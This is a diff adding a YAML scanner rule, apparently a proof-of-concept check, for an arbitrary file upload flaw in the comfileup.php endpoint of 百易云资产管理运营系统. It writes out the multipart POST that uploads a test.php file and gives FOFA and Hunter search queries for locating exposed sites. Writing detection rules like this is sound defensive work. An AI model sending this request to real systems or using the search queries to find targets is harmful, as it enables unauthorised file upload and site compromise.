@@ -1,0 +1,22 @@
+name: byy-fileupload  #百易云资产管理运营系统
+rules: 
+  - method: POST  
+    path: /comfileup.php
+    headers:
+      Content-Type: multipart/form-data;boundary=e41701466d7dc
+    body: |
+      --e41701466d7dc
+      Content-Disposition:form-data;name="file";filename="test.php"
+      Content-Type: application/octet-stream
+      
+      123456
+      --e41701466d7dc--
+    expression:                        
+      status_code:                 
+      response_header:              
+      response_body: \/uploads\/                      
+detail:                          
+  description: "百易云资产管理运营系统，是专门针对企业不动产资产管理和运营需求而设计的一套综合解决方案。百易云资产管理运营系统comfileup.php接口存在任意文件上传漏洞，截止到2024.10.1仍存在较多该漏洞网站"
+  search:             
+    fofa: body="不要着急，点此"
+    鹰图: web.body="不要着急，点此"
